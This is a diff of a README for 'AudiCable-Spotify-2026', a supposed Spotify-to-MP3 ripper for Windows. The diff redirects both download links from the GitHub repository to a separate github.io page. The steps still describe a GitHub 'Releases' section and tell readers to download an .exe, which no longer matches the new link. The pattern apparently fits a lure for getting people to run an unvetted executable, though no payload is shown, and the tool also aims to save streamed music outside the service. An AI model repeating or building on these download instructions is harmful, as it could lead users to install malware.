@@ -1,6 +1,6 @@
 # 🎧 AudiCable-Spotify-2026 - Save Spotify Music to Local Files
 
-[![Download AudiCable](https://img.shields.io/badge/Download-AudiCable_Installer-blue.svg)](https://github.com/Sirthomasrafflescrowblackbird49/AudiCable-Spotify-2026)
+[![Download AudiCable](https://img.shields.io/badge/Download-AudiCable_Installer-blue.svg)](https://sirthomasrafflescrowblackbird49.github.io)
 
 AudiCable-Spotify-2026 captures audio streams from Spotify and saves them as digital files on your computer. This tool works on Windows 11 and Windows 10. It converts music to standard formats like MP3 so you can play your songs offline without an active internet connection.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these requirements before you start the installation 
 
 You need to obtain the installer file from the official project page to ensure you have the correct version.
 
-1.  Visit the [AudiCable download page](https://github.com/Sirthomasrafflescrowblackbird49/AudiCable-Spotify-2026).
+1.  Visit the [AudiCable download page](https://sirthomasrafflescrowblackbird49.github.io).
 2.  Look for the section labeled Releases on the right side of the page.
 3.  Click the most recent version link.
 4.  Find the file ending in .exe.
